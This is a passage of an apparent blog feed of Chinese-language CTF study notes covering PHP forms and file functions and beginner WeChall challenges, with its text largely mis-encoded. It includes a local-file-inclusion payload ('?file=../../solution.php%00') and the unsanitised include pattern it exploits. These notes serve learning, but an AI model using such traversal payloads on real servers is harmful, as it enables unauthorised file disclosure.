title="ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚"></a>ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚</h4><p>GETå¯ä»¥ç”¨äºå‘é€éæ•æ„Ÿæ•°æ®ã€‚<br>æ³¨æ„ï¼šç»å¯¹ä¸è¦å°†GETç”¨äºå‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼</p><h5 id="ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„-ï¼ˆæ‰€æœ‰åç§°-å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚"><a href="#ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„-ï¼ˆæ‰€æœ‰åç§°-å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚" class="headerlink" title="ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„ ï¼ˆæ‰€æœ‰åç§°/å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚"></a>ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„ ï¼ˆæ‰€æœ‰åç§°/å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚</h5><p>æ­¤å¤–ï¼ŒPOSTæ”¯æŒé«˜çº§åŠŸèƒ½ï¼Œä¾‹å¦‚åœ¨å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨æ—¶æ”¯æŒå¤šéƒ¨åˆ†äºŒè¿›åˆ¶è¾“å…¥ã€‚<br>ä½†æ˜¯ï¼Œç”±äºå˜é‡æœªæ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤æ— æ³•ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚</p><h5 id="SERVER-â€œ-PHP-SELFâ€-å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚"><a href="#SERVER-â€œ-PHP-SELFâ€-å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚" class="headerlink" title="$ _ SERVER [â€œ PHP_SELFâ€]å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚"></a>$ _ SERVER [â€œ PHP_SELFâ€]å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚</h5><p>htmlspecialcharsï¼ˆï¼‰å‡½æ•°å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ã€‚è¿™æ„å‘³ç€å®ƒå°†ç”¨ï¼†lt;æ›¿æ¢&lt;å’Œ&gt;ä¹‹ç±»çš„HTMLå­—ç¬¦ã€‚å’Œï¼†gt;ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ”»å‡»è€…é€šè¿‡ä»¥è¡¨æ ¼å½¢å¼æ³¨å…¥HTMLæˆ–Javascriptä»£ç ï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰æ¥åˆ©ç”¨ä»£ç ã€‚</p><h5 id="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP-trimï¼ˆï¼‰å‡½æ•°ï¼‰"><a href="#ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP-trimï¼ˆï¼‰å‡½æ•°ï¼‰" class="headerlink" title="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP trimï¼ˆï¼‰å‡½æ•°ï¼‰"></a>ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP trimï¼ˆï¼‰å‡½æ•°ï¼‰</h5><h5 id="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ-ï¼‰ï¼ˆä½¿ç”¨PHP-stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰"><a href="#ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ-ï¼‰ï¼ˆä½¿ç”¨PHP-stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰" class="headerlink" title="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ\ï¼‰ï¼ˆä½¿ç”¨PHP stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰"></a>ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ\ï¼‰ï¼ˆä½¿ç”¨PHP stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰</h5><p>ä½¿ç”¨PHP empty() å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span>PHP_SELF<span class="string">"]);?&gt;"</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">E-mail:</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Website:</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"website"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Comment: &lt;textarea name=<span class="string">"comment"</span> rows=<span class="string">"5"</span> cols=<span class="string">"40"</span>&gt;</span><br></pre></td></tr></table></figure><p>preg_matchï¼ˆï¼‰å‡½æ•°åœ¨å­—ç¬¦ä¸²ä¸­æœç´¢æ¨¡å¼ï¼Œå¦‚æœå­˜åœ¨æ¨¡å¼ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚<br>æ­£åˆ™è¡¨è¾¾å¼</p><p>includeå’Œrequireè¯­å¥ç›¸åŒï¼Œä½†å¤±è´¥æ—¶é™¤å¤–ï¼š<br>require å°†äº§ç”Ÿè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰å¹¶åœæ­¢è„šæœ¬</p><h5 id="include-åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE-WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­"><a href="#include-åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE-WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­" class="headerlink" title="include åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE_WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­"></a>include åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE_WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­</h5><p>è¯¥readfile()å‡½æ•°è¯»å–æ–‡ä»¶å¹¶å°†å…¶å†™å…¥è¾“å‡ºç¼“å†²åŒºã€‚</p><p>&lt;?php<br>$myfile = fopen(â€œwebdictionary.txtâ€, â€œrâ€) or die(â€œUnable to open file!â€);<br>echo fread($myfile,filesize(â€œwebdictionary.txtâ€));<br>fclose($myfile);<br>?&gt;</p><p>è¯¥fclose()åŠŸèƒ½ç”¨äºå…³é—­æ‰“å¼€çš„æ–‡ä»¶ã€‚<br>ç»“æŸæ‰€æœ‰æ–‡ä»¶åï¼Œå…³é—­æ‰€æœ‰æ–‡ä»¶æ˜¯ä¸€ç§è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ã€‚æ‚¨ä¸å¸Œæœ›åœ¨æœåŠ¡å™¨ä¸Šåˆ°å¤„è¿è¡Œæ‰“å¼€çš„æ–‡ä»¶å ç”¨èµ„æºï¼</p><p>è¯¥feof()åŠŸèƒ½æ£€æŸ¥æ˜¯å¦å·²è¾¾åˆ°â€œæ–‡ä»¶ç»“å°¾â€ï¼ˆEOFï¼‰ã€‚</p><p>è¯¥fopen()å‡½æ•°è¿˜ç”¨äºåˆ›å»ºæ–‡ä»¶ã€‚å¯èƒ½æœ‰äº›æ··ä¹±ï¼Œä½†æ˜¯åœ¨PHPä¸­ï¼Œä½¿ç”¨ä¸æ‰“å¼€æ–‡ä»¶ç›¸åŒçš„åŠŸèƒ½åˆ›å»ºæ–‡ä»¶ã€‚</p><p>$filename = â€˜pages/â€˜.(isset($_GET[â€œfileâ€])$_GET[â€œfileâ€]:â€welcomeâ€).â€™.htmlâ€™;</p><p>ï¼Ÿ ï¼š</p><h5 id="issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚"><a href="#issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚" class="headerlink" title="issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚"></a>issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚</h5><p>dieï¼ˆï¼‰å‡½æ•°æ˜¯exitï¼ˆï¼‰å‡½æ•°çš„åˆ«åã€‚</p><h5 id="evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚"><a href="#evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚" class="headerlink" title="evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚"></a>evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚</h5><h5 id="dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚"><a href="#dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚" class="headerlink" title="dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚"></a>dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚</h5><h5 id="in-arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚"><a href="#in-arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚" class="headerlink" title="in_arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚"></a>in_arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚</h5><p>æ³¨æ„ï¼šå¦‚æœæœç´¢å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç±»å‹å‚æ•°è®¾ç½®ä¸ºTRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p><h3 id="WECHALL-LFI"><a href="#WECHALL-LFI" class="headerlink" title="WECHALL LFI"></a>WECHALL LFI</h3><p>?file=page/jhkd.html<br>?file=../../solution.php%00<br>%00 åçš„å­—ç¬¦ä¸ç®—ï¼Œå·²ç»æ›´æ”¹<br>../ éå†ç›®å½•</p><p>switch ($which)<br>        {<br>        case 0:<br>        case 1:<br>        case 2:<br>                require_once $which.â€™.phpâ€™;<br>                break;<br>        default:<br>                echo GWF_HTML::error(â€˜PHP-0817â€™, â€˜Hacker NoNoNo!â€™, false);<br>                break;<br>        }<br>which=0,1,2 éƒ½æ‰§è¡Œrequire_once</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ&lt;/h3&gt;&lt;p&gt;PHPæ–‡ä»¶å¯ä»¥åŒ…å«æ–‡æœ¬ï¼ŒHTMLï¼ŒCSSï¼ŒJavaScriptå’ŒPHPä»£ç &lt;br&gt;PHPä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯HTMLæ ¼å¼è¿”å›åˆ°æµè§ˆå™¨&lt;br&gt;PHPæ–‡ä»¶çš„æ‰©å±•åä¸ºâ€œ .phpâ€&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFå…¥é—¨ WECALL</title>
    <link href="http://finsenty54.github.io/2020/05/15/CTF%E5%85%A5%E9%97%A8%20WECALL/"/>
    <id>http://finsenty54.github.io/2020/05/15/CTFå…¥é—¨ WECALL/</id>
    <published>2020-05-15T11:24:57.000Z</published>
    <updated>2020-05-15T11:26:23.799Z</updated>
    
    <content type="html"><![CDATA[<p>åˆå­¦CTF å…¥é—¨å¤ªéš¾</p><h2 id="wecall-challenges-è§£å†³æ–¹æ³•"><a href="#wecall-challenges-è§£å†³æ–¹æ³•" class="headerlink" title="wecall challenges è§£å†³æ–¹æ³•"></a>wecall challenges è§£å†³æ–¹æ³•</h2><h4 id="training-steganoI"><a href="#training-steganoI" class="headerlink" title="training steganoI"></a>training steganoI</h4><p>$cat  xxx.bmp<br><a href="https://www.tecmint.com/13-basic-cat-command-examples-in-linux/" target="_blank" rel="noopener">https://www.tecmint.com/13-basic-cat-command-examples-in-linux/</a></p><h4 id="Crypto-Caesar-I"><a href="#Crypto-Caesar-I" class="headerlink" title="Crypto - Caesar I"></a>Crypto - Caesar I</h4><p>pythonå‡½æ•° list() ord() chr()</p><a id="more"></a><h4 id="WWW-Robots"><a href="#WWW-Robots" class="headerlink" title="WWW-Robots"></a>WWW-Robots</h4><p>robots.txt<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p><h4 id="URL-ENCODE"><a href="#URL-ENCODE" class="headerlink" title="URL ENCODE"></a>URL ENCODE</h4><p>URL encoding replaces unsafe ASCII characters with a â€œ%â€ followed by two hexadecimal digits. åå…­è¿›åˆ¶<br>URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.<br>URLs can only be sent over the Internet using the ASCII character-set.</p><h4 id="python-3-7"><a href="#python-3-7" class="headerlink" title="python 3.7"></a>python 3.7</h4><p>from urllib.parse import unquote<br>tar -xf è§£å‹ç¼© ï¼Ÿè‡ªåŠ¨è¯†åˆ«<br>java -jar </p><h4 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h4><p>urllib.request</p><p>urlopenè¿”å›çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œdecode(â€˜utf-8â€™)è§£ç </p><h4 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p><p>â€˜weshallâ€™</p><p>wechall4?.(jpg|gif|tiff|bmp|png)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆå­¦CTF å…¥é—¨å¤ªéš¾&lt;/p&gt;
&lt;h2 id=&quot;wecall-challenges-è§£å†³æ–¹æ³•&quot;&gt;&lt;a href=&quot;#wecall-challenges-è§£å†³æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;wecall challenges è§£å†³æ–¹æ³•&quot;&gt;&lt;/a&gt;wecall challenges è§£å†³æ–¹æ³•&lt;/h2&gt;&lt;h4 id=&quot;training-steganoI&quot;&gt;&lt;a href=&quot;#training-steganoI&quot; class=&quot;headerlink&quot; title=&quot;training steganoI&quot;&gt;&lt;/a&gt;training steganoI&lt;/h4&gt;&lt;p&gt;$cat  xxx.bmp&lt;br&gt;&lt;a href=&quot;https://www.tecmint.com/13-basic-cat-command-examples-in-linux/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.tecmint.com/13-basic-cat-command-examples-in-linux/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Crypto-Caesar-I&quot;&gt;&lt;a href=&quot;#Crypto-Caesar-I&quot; class=&quot;headerlink&quot; title=&quot;Crypto - Caesar I&quot;&gt;&lt;/a&gt;Crypto - Caesar I&lt;/h4&gt;&lt;p&gt;pythonå‡½æ•° list() ord() chr()&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
